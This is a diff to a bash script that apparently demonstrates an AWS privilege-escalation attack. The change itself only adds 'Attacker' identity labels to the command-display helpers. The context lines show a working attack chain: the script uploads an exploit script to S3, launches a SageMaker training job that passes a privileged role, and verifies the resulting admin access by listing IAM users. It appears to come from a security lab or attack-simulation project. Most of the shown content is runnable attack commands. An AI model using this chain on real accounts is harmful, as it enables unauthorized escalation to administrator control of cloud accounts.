@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -95,7 +97,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -107,7 +109,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -115,7 +117,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -162,7 +164,7 @@ tar -czf sourcedir.tar.gz $EXPLOIT_SCRIPT
 cd - > /dev/null
 
 echo "Uploading to: s3://$BUCKET_NAME/sourcedir.tar.gz"
-show_cmd aws s3 cp /tmp/sourcedir.tar.gz s3://$BUCKET_NAME/sourcedir.tar.gz
+show_cmd "Attacker" "aws s3 cp /tmp/sourcedir.tar.gz s3://$BUCKET_NAME/sourcedir.tar.gz"
 aws s3 cp /tmp/sourcedir.tar.gz s3://$BUCKET_NAME/sourcedir.tar.gz
 
 echo -e "${GREEN}✓ Exploit script packaged and uploaded to S3${NC}\n"
@@ -211,7 +213,7 @@ echo "Using role: $PASSABLE_ROLE_ARN"
 echo "This will take 3-5 minutes to provision and execute..."
 echo ""
 
-show_attack_cmd aws sagemaker create-training-job --region $AWS_REGION --training-job-name $TRAINING_JOB_NAME --role-arn $PASSABLE_ROLE_ARN --algorithm-specification "{\"TrainingImage\": \"$CONTAINER_IMAGE\", \"TrainingInputMode\": \"File\"}" --input-data-config "[{\"ChannelName\": \"training\", \"DataSource\": {\"S3DataSource\": {\"S3DataType\": \"S3Prefix\", \"S3Uri\": \"s3://$BUCKET_NAME\", \"S3DataDistributionType\": \"FullyReplicated\"}}}]" --output-data-config "{\"S3OutputPath\": \"s3://$BUCKET_NAME/output\"}" --resource-config "{\"InstanceType\": \"ml.m5.large\", \"InstanceCount\": 1, \"VolumeSizeInGB\": 10}" --stopping-condition "{\"MaxRuntimeInSeconds\": 600}" --hyper-parameters "{\"sagemaker_program\": \"$EXPLOIT_SCRIPT\", \"sagemaker_submit_directory\": \"s3://$BUCKET_NAME/sourcedir.tar.gz\"}"
+show_attack_cmd "Attacker" "aws sagemaker create-training-job --region $AWS_REGION --training-job-name $TRAINING_JOB_NAME --role-arn $PASSABLE_ROLE_ARN --algorithm-specification "{\"TrainingImage\": \"$CONTAINER_IMAGE\", \"TrainingInputMode\": \"File\"}" --input-data-config "[{\"ChannelName\": \"training\", \"DataSource\": {\"S3DataSource\": {\"S3DataType\": \"S3Prefix\", \"S3Uri\": \"s3://$BUCKET_NAME\", \"S3DataDistributionType\": \"FullyReplicated\"}}}]" --output-data-config "{\"S3OutputPath\": \"s3://$BUCKET_NAME/output\"}" --resource-config "{\"InstanceType\": \"ml.m5.large\", \"InstanceCount\": 1, \"VolumeSizeInGB\": 10}" --stopping-condition "{\"MaxRuntimeInSeconds\": 600}" --hyper-parameters "{\"sagemaker_program\": \"$EXPLOIT_SCRIPT\", \"sagemaker_submit_directory\": \"s3://$BUCKET_NAME/sourcedir.tar.gz\"}""
 aws sagemaker create-training-job \
     --region $AWS_REGION \
     --training-job-name $TRAINING_JOB_NAME \
@@ -306,7 +308,7 @@ echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 echo ""
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
